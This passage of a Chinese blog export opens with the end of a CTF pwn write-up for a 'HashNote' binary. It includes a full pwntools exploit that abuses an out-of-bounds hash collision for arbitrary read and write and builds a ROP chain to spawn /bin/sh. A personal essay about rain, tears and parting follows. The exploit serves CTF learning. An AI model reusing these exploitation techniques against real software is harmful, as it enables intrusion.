<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./HashNote&#x27;</span></span><br><span class="line"><span class="comment"># libc_path=&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p=remote(&quot;&quot;.)</span></span><br><span class="line">p= process(elf_path)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line"><span class="comment"># libc=ELF(libc_path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">newname</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;New username: &#x27;</span>,newname.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">key,data</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Key: &#x27;</span>,key)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Data: &#x27;</span>,data)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Key: &#x27;</span>,key)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">key,data</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Key: &#x27;</span>,key)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Data: &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x405e7c</span></span><br><span class="line">pop_rsi=<span class="number">0x40974f</span></span><br><span class="line">pop_rax=<span class="number">0x4206ba</span></span><br><span class="line">pop_rdx_rbx=<span class="number">0x53514b</span></span><br><span class="line">syscall=<span class="number">0x4560c6</span></span><br><span class="line"></span><br><span class="line">username=<span class="number">0x5dc980</span></span><br><span class="line">stack=<span class="number">0x5e4fa8</span></span><br><span class="line">ukey=<span class="string">b&#x27;\x30&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;\x31&#x27;</span>+<span class="string">b&#x27;\x44&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------</span></span><br><span class="line">fake_chunk=flat(&#123;</span><br><span class="line">    <span class="number">0</span>:username+<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x10</span>:[username+<span class="number">0x20</span>,<span class="built_in">len</span>(ukey),\</span><br><span class="line">        ukey,<span class="number">0</span>],</span><br><span class="line">    <span class="number">0x30</span>:[stack,<span class="number">0x10</span>]</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Username&#x27;</span>,fake_chunk)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Password: &quot;</span>,<span class="string">b&quot;freep@ssw0rd:3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造</span></span><br><span class="line">insert(<span class="string">b&#x27;\x30&#x27;</span>*<span class="number">1</span>+<span class="string">b&#x27;\x31&#x27;</span>+<span class="string">b&#x27;\x44&#x27;</span>,<span class="string">b&#x27;test&#x27;</span>) <span class="comment"># 126</span></span><br><span class="line">insert(<span class="string">b&#x27;\x30&#x27;</span>*<span class="number">2</span>+<span class="string">b&#x27;\x31&#x27;</span>+<span class="string">b&#x27;\x44&#x27;</span>,<span class="string">b&#x27;test&#x27;</span>) <span class="comment"># 127 数组越界</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># 任意地址读 leak stack</span></span><br><span class="line">query(<span class="string">b&#x27;\x30&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;\x31&#x27;</span>+<span class="string">b&#x27;\x44&#x27;</span>)</span><br><span class="line">main_ret=u64(p.recv(<span class="number">8</span>))-<span class="number">0x1e0</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------</span></span><br><span class="line">fake_chunk=flat(&#123;</span><br><span class="line">    <span class="number">0</span>:username+<span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x20</span>:[username+<span class="number">0x30</span>,<span class="built_in">len</span>(ukey),\</span><br><span class="line">        ukey,<span class="number">0</span>],</span><br><span class="line">    <span class="number">0x40</span>:[main_ret,<span class="number">0x100</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>]</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">change(fake_chunk) <span class="comment"># 准备任意地址写</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop</span></span><br><span class="line">payload=flat([</span><br><span class="line">    pop_rdi,username+<span class="number">0x50</span>,</span><br><span class="line">    pop_rsi,<span class="number">0</span>,</span><br><span class="line">    pop_rdx_rbx,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    pop_rax,<span class="number">0x3b</span>,</span><br><span class="line">    syscall</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">modify(ukey,payload) <span class="comment"># 任意地址写</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>) <span class="comment"># 退出main，触发rop</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul>
<li>逆昏头的时候也要适时保持理智</li>
<li>以及作为攻击者要对各种合法的特殊情况敏感，主动去找特殊情况，比如这道题里不同 key 同哈希的情况。</li>
</ul>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><blockquote>
<p><a class="link"   href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat" >pwntools中flat的使用方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.dr0n.top/posts/f249db01/" >https://www.dr0n.top/posts/f249db01/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://fushuling.com/index.php/2024/05/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-greatwall%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/" >https://fushuling.com/index.php/2024/05/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-greatwall%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>学习日志</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>断雨残珠垂眼落</title>
    <url>/2025/02/16/%E6%96%AD%E9%9B%A8%E6%AE%8B%E7%8F%A0%E5%9E%82%E7%9C%BC%E8%90%BD/</url>
    <content><![CDATA[<p><em>φ</em>(．．)</p>
<blockquote>
<p>写这篇对比上篇吃力了很多<br>尽管还是在第一人称的相对舒适区<br>希望能带给你新的感受，或者，新的思考</p>
</blockquote>
<h3 id="碎雨断珠垂眼落"><a href="#碎雨断珠垂眼落" class="headerlink" title="碎雨断珠垂眼落"></a>碎雨断珠垂眼落</h3><p>&emsp;&emsp;正如这个世界默认性别是男，女人是第二性一样。天气的默认身份是晴。</p>
<p>&emsp;&emsp;今天下雨，是一件特殊的事。</p>
<p>&emsp;&emsp;故而，雨天总是格外容易被记住。也的确，我生命里有好多场雨，让人铭记。</p>
<br>

<p>&emsp;&emsp;人们总对雨留有些老套的刻板印象。其中最俗，那必然是文学里的雨。都说无巧不成书，不巧的雨，是不会被记录的。书里的雨，总是被排布着适时地出现，烘托着窘境奈何，暗示着情思几两，又或是化身无情残酷的重嶂。字里行间我见不到雨，只能见到，天空在漏水。</p>
<p>&emsp;&emsp;不过俗未免是坏事，那些高山流水太遥远，终将被遗忘。</p>
<p>&emsp;&emsp;木偶一样机械的雨，依旧是动人的雨。就像失意那日天色阴沉雷声轰鸣，而后雨滴狠狠砸碎在地面上；就像江南小河上乌篷船摇摆，烟雨朦胧景色泛起白雾；就像漫步雨中听滴答滴，雨滴飞身亲吻头顶；就像又是八月季雨时分，马孔多淅淅沥沥，雨只是落下，只是落下。</p>
<p>&emsp;&emsp;在潮湿的回忆中，我们把自己作为故事的主角，自说自话地假设雨的戏份。但作为相当尊敬自然风物的人，我总觉得，雨怎么想，也很重要。</p>
<p>&emsp;&emsp;我猜测，或许有时她在乎人们如何看待她，是敬畏还是感恩，偶尔回应人类。雨暴怒，掀翻屋顶，打烂枝桠；雨慈悲，温柔俯身，润物无声。但当我们不再幻想、惦念雨的更多时候，雨潇洒而自由，来了又走，环游世界。她留下片片积水，人来车往水花四溅；道路泥泞湿滑，结伴的人必须紧紧相牵；江边长椅沾湿，观雨的人无处可坐。雨埋下一点麻烦，制造一点情趣，最后看我们笑话。</p>
<p>&emsp;&emsp;雨是一滴人，有自己的脾气，每一滴雨轻或重，每一场雨短暂或持久，都是心情的写照。</p>
<p>&emsp;&emsp;就比如说夏天的阵雨，是很不讲道理的。暑天闷热，雨珠飞溅，雨任性，打得树叶噼里啪啦响。屋与瓦庇护我，看那些疯狂的雨珠翻过阳台，挤过纱窗，打到脸上，是夏日难得的凉爽。屋外滂沱，自成风景，屋内却是微风轻拂。衣衫轻薄，自在悠闲。我知道，我当然知道，夏天的雨很不方便交通，一不小心车子打滑或是淹了地铁口，步行撑伞也会溅湿裤脚，可我私心，可我实在私心，想我不用出门，看雨多跳几支踢踏。</p>
<p>&emsp;&emsp;有段时间，我总是哭。故而也开始思考有关这些任性的泪的事。流泪是很有意思的话题，人的身体，由内而外的向外满溢出一些东西。在各种各样的情绪反馈里，泪是最有实感的一个。从切身体会出发，我觉得泪并非受人控制。像雨一样，它有自己的温度，大小，节奏。流泪的感受，总是不尽相同。当泪不受控制的流过我，我也成了泪途经的一站。</p>
<p>&emsp;&emsp;雨是无根之水，匆匆脱离云的怀抱，又奔向大地。或许我也是无根之人，从小到大，无处安定，步履不停，辗转几多。幸运，总能遇上一句顶一万句的朋友，不幸，匆匆离别在昨日，萧瑟难忘是儿时。不过越长大，我越诋毁一段关系的难得，像是害怕离别，而不敢付出更多，袒露更多，奢求更多。我期盼结下长期的关系，慢慢放弃与无聊的人周旋。不想认识新朋友，不想押注兴奋的神经，不想只是被途经。真心依旧，却不再直白，人就是这样变慢热。而只有那段来自十一二岁的情谊，逃过自我教化、约束的怪圈。雷声先至，而后雨点落下，刹那间点燃无条件。</p>
<p>&emsp;&emsp;我仍然清楚的记得这样一天，和旧友们重聚的那天，雨下的极大的一天。无法预知的台风天，送给城市积水与吵闹。我心忐忑，雨点也翻涌。</p>
<p>&emsp;&emsp;我好奇，怎样的人，才值得湿了半身也要去见，怎样一群人，五六年不联系却依然相互惦念。朴素的生活经验告诉我们，渐行渐远是人生常态。甚至，我们也会厌烦，厌烦一段长期的关系，可能是我们变心，也可能是其他。我们无法预知我们未来如何看待眼前人，是难舍还是早已忘却，甚至心生嫌隙，正如我们无法预知别人如何看待我们。总之，随着时间的跃进，越来越惺惺相惜和越来越相看两厌的程度对不同的人单调递增。我害怕，已然散落天涯海角的水滴再聚首，能否如当年那般亲密无间？</p>
<p>&emsp;&emsp;人是一场雨，打湿衣衫，布料湿乎乎的黏在身上。</p>
<p>&emsp;&emsp;有时，眼泪听上去更像是一种礼遇。受过泪的人和事，自然而然更显情真意切。于是反过来，人是忍不住的，忍不住为了情真意切而落泪，因为这是一种礼遇。眼泪，有时是受人控制的。此时此刻，泪回到我的身体，听候我的差遣。主观上，我想落泪，我想礼赞这一场雨。</p>
<p>&emsp;&emsp;水和水相遇，你中一点我，我中一丝你。这一晚，逃回雨里去。</p>
<p>&emsp;&emsp;对一段关系期待永不落幕实在是太正常了，有人无法接受异地恋，有人无法接受子女远行，有人无法接受升学后与好友的分别……甚至是在未达现实的幻想里，小说里至亲至爱反目，故事角色遗憾收尾都让人意难平。若从噩梦中醒来，人会庆足有余，同样的，当我们意识到，那些让人化成一滩暖洋洋的水的时刻不再回来，难免落寞，难免心伤。</p>
<p>&emsp;&emsp;倘若结局凄凉，再浪漫美好的过程是否也会变惨烈？动人的雨，落下那刻便是动人的雨，一件事带来的感受如何，不应由未来决定。我亲近雨，像很多人亲近雨那样乐意下雨不打伞，即便当真感冒发烧，也愿意再次这样邂逅雨。抗拒离别，恰让人回忆相逢的喜悦。于是，在马不停蹄告别的生活里，我只能深刻地认识到，没谁能陪我到最后。这不是为了强调人要一个人过一辈子，而是，尝试用平常代替不甘，削弱失落。</p>
<p>&emsp;&emsp;可是尽管我想的再豁达，但面对死亡这样，永久性的离别命题时，我实在无法用理论实践生活。有时真叫奇怪，有些擦肩而过，分道扬镳的结局与死了没什么区别，同样是在生命中永远的不再出现了。可是，可是如果知道是生离死别，难免不忍，难免计较。</p>
<p>&emsp;&emsp;可是，可是，如果知道我真的死了，你会怀念我吗？</p>
<p>&emsp;&emsp;这是因为我是一条生命，还是因为我是我。</p>
<p>&emsp;&emsp;我一直认为，死与生不是简单的像硬币一样的一体两面，死是先于生的概念。有了所谓死，才有所谓生，但没有反过来的道理。人的一生，就是在“未亡”的状态里走向“死亡”。这样说并不让我觉得死比生就高贵了，我一直钦佩生的勇气。只是这样说，听起来，死比生更加接近真理。</p>
<p>&emsp;&emsp;又是回南天，梅雨纷纷。发霉的日子里，雨滴们打穿屋顶，渗透墙壁，稀里哗啦的漏了一盆又一盆，就像人们自顾自地编排雨那样自顾自。</p>
<p>&emsp;&emsp;雨告诉我，无相逢，不离别。相逢是先于离别存在的概念。</p>
<br>

<p>&emsp;&emsp;我有时分不清，我身边的人，是一场雨，还是一把伞。我喜欢他们，是喜欢雨，还是喜欢躲雨。</p>
<p>&emsp;&emsp;我频繁怀念，雨陪泪落下，心事不用埋进土里。</p>
<p>&emsp;&emsp;泪水匆匆，碎雨断珠垂眼落。 </p>
]]></content>
      <tags>
        <tag>白鸟</tag>
      </tags>
  </entry>
</search>
